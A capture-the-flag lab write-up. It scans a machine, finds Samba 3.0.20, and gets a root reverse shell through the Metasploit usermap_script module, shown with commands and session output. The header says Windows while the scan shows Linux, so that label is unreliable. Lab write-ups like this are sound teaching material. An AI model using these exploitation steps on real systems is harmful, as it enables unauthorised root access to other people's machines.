# Legacy

Machine Level: Easy <br />
OS: Windows

## Scanning
I ran an aggressive NMAP script to determine the services and OS on the box. 
```
ajread@aj-ubuntu:~$ nmap -A [TARGET IP]-Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-21 15:55 EST
Nmap scan report for [TARGET IP]
Host is up (0.019s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to [LOCAL IP]
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
|_smb-security-mode: ERROR: Script execution failed (use -d to debug)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.81 seconds
```
There wasn't anything that I could find on ```ftp```. 
```
ajread@aj-ubuntu:~$ ftp [TARGET IP]
Connected to [TARGET IP].
220 (vsFTPd 2.3.4)
Name (10.10.10.3:ajread): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||64004|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> exit
221 Goodbye.
```
With the SMB scanner, I was able to determine that the version was Samba 3.0.20-Debian. 
```
[*] [TARGET IP]:445        - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)
[*] [TARGET IP]:445        -   Host could not be identified: Unix (Samba 3.0.20-Debian)
[*] [TARGET IP]:           - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
## Initial Access
I searched for the version of Samba in metasploit and found an excellent module for ```usermap_script``` to complete RCE. According to Rapid7, specifying a username with shell meta-characters allows a user to run commands. 

I set the appropriate inputs and ran the exploit in metasploit, which dropped me into a root shell! 
```
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on [LOCAL IP]:4444 
[*] Command shell session 1 opened ([LOCAL IP]:4444 -> [TARGET IP]:40884) at 2023-01-21 16:17:41 -0500

whoami
root
id
uid=0(root) gid=0(root)
```
I was able to read the user and root flags. 
```
wc -c user.txt
33 user.txt
wc -c /root/root.txt
33 /root/root.txt
```